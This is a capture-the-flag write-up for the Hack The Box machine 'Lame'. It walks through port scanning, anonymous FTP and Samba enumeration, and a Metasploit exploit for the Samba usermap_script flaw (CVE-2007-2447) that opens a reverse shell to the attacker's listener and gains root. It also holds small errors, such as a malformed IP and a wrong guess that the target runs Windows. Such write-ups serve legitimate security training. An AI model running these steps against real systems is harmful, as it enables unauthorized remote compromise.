# Lame

---

## Setup

Spawned in the machine as always, got the IP and stored it in an environment variable in case I lose it -as always-

```shell
└─$ export IP=10.10.10.10.3
└─$ echo $IP
10.10.10.10.3
```

and to make sure everything is working alright and the target machine is up and running, we can use `ping` to make sure it's alive.

```shell
└─$ ping $IP
PING 10.10.10.10.3 (10.10.10.10.3) 56(84) bytes of data.
64 bytes from 10.10.10.10.3: icmp_seq=1 ttl=63 time=69.3 ms
64 bytes from 10.10.10.10.3: icmp_seq=2 ttl=63 time=68.1 ms
64 bytes from 10.10.10.10.3: icmp_seq=3 ttl=63 time=67.9 ms
64 bytes from 10.10.10.10.3: icmp_seq=4 ttl=63 time=70.4 ms
```

---

## Enumeration

First step after spawning in the target machine and connected to the VPN, I start an [`nmap`](https://nmap.org) scan to determine open ports and running services and may be vulnerable using the following flags:

`-sV`: Determine running services/versions on open ports
`-sC`: Run default scripts
`-p-`: Scan all possible ports
`-v`: Verbose output for more information about the scan
`-oN`: Write the output of the scan into a file

```shell
$ nmap -sV -sC -p- -v -oN scan.nmap $IP
```

The scan is interrupted and nmap suggests `Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn`. This means that the target machine is blocked nmap's ping scan which is its starting step to determine whether the host is up or down, this probably means that the target machine is running Windows OS, so I used the flag `-Pn` to treat the host as alive and skip this initial checking step.

After the scan is complete, here's the result:

```shell
Nmap scan report for 10.10.10.3
Host is up (0.087s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

and some interesting results of the scripts that was run during the scan, a lot of space to to play in.

```shell
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-09-19T02:44:01-04:00
|_clock-skew: mean: 2h00m18s, deviation: 2h49m44s, median: 16s
```

---

## FTP

First, I tried connecting to the FTP server running on the target machine, based on the scan result it showed it allows anonymous login with a blank password, but there wasn't much there, in fact, there was nothing there:

```shell
└─$ ftp ftp://anonymous@$IP
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||41988|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> pwd
Remote directory: /
ftp> bye
221 Goodbye.
```

---

## Samba

Next step I tried enumerating shares in the SMB service running on the target machine and see if there's something there that I can work with:

```shell
└─$ smbclient -L $IP         
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
```

the `tmp` share is the only one i could get with anonymous login and blank password:

```shell
└─$ smbclient \\\\$IP\\tmp                                
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep 19 03:22:49 2022
  ..                                 DR        0  Sat Oct 31 02:33:58 2020
  cbhaawe                             N        0  Mon Sep 19 03:21:10 2022
  .ICE-unix                          DH        0  Mon Sep 19 02:40:56 2022
  vmware-root                        DR        0  Mon Sep 19 02:41:24 2022
  .X11-unix                          DH        0  Mon Sep 19 02:41:22 2022
  .X0-lock                           HR       11  Mon Sep 19 02:41:22 2022
  vgauthsvclog.txt.0                  R     1600  Mon Sep 19 02:40:54 2022
  5574.jsvc_up                        R        0  Mon Sep 19 02:41:59 2022

                7282168 blocks of size 1024. 5386512 blocks available
smb: \> 
```

 I downloaded all the files I had access to; `vgauthsvclog.txt.0`, `.X0-lock` but got me to nowhere, so I started searching online for Samba exploitations, since FTP had really nothing to even work with..

 ---

## Exploitation 

after quite some time reading online on Samba version 3.0.2 I came across `CVE-2007-2447`, read more [here](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2007-2447), I also used [exploitdb](https://github.com/offensive-security/exploitdb) to see if there's anything I can use:

```shell
└─$ /opt/exploitdb/searchsploit samba 3.0.2
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                     | unix/remote/16320.rb
````

Awesome, a metasploit exploit that I can use, I launched `msfconsole` and used:

```shell
└─$msfconsole

...

msf6 > search samba    

....
   8   exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba "username map script" Command Execution
....

msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set lhost 10.10.16.4
lhost => 10.10.16.4
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Command shell session 1 opened (10.10.16.4:4444 -> 10.10.10.3:54174 ) at 2022-09-19 03:19:21 -0400

whoami
root
shell
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
whoami
whoami
root
root@lame:/#
````

I'm in! the root flag was found on `/root/root.txt` and user flag in `/home/makis/user.txt`
